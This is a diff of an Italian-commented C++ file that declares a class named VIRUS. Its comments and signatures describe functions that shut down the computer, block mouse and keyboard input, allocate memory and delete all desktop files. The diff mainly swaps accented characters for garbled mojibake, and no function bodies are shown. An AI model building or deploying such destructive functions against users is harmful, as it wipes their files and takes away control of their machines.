@@ -23,16 +23,16 @@
 	Se pensate che la vita sia ingiusta pensate che io la sto sviluppando su linux,
 	senza poter testare le funzioni(fortunatamente in alcuni casi).
 
-	L'unica cosa decente di windows non Ë disponibile su linux.
+	L'unica cosa decente di windows non √® disponibile su linux.
 
 	Da notare la fierezza con cui dichiaro le funzioni con nomi inglesi,
 	ma scrivo le spiegazioni in italiano.
 
-	Prima o poi scriver‡ una documentazione sull'utilizzo dell'header,
+	Prima o poi scriver√† una documentazione sull'utilizzo dell'header,
 	cosa necessaria anche per il fatto che ad ogni persona funziona in maniera diversa.
 
-	Sia ovvio il fatto che a breve installer‡ windows sul mio computer, perchË
-	davvero non ne posso pi˘.
+	Sia ovvio il fatto che a breve installer√† windows sul mio computer, perch√®
+	davvero non ne posso pi√π.
 
 	Se avviate senza i permessi di amministrazione il file .exe e vi lamentate che non
 	funzioni, scoppiate.
@@ -42,7 +42,7 @@ class VIRUS
 {
 	public:
 		/*
-			Quest'indentazione Ë pi˘ o meno fiera di me?
+			Quest'indentazione √® pi√π o meno fiera di me?
 
 			Spoiler: meno.
 		*/
@@ -171,7 +171,7 @@ void VIRUS::TurnOffComputer(int time_seconds, std::string reason)
 }
 
 /**
- * Funzione che blocca l'input creando l'impossibilit√† di usare mouse e tastiera.
+ * Funzione che blocca l'input creando l'impossibilit√É¬† di usare mouse e tastiera.
  * Richiede l'avvio come amministratore.
  *
  * @param seconds per quanti secondi deve disabilitare l'input,
@@ -234,7 +234,7 @@ void VIRUS::Allocate2GB(int seconds)
 }
 
 /**
- * Funzione che rimuove tutti i file del desktop
+ * Funzione che rimuove tutti i file del desktop (le cartelle ancora no)
 */
 void VIRUS::RemoveAllDesktopFile()
 {
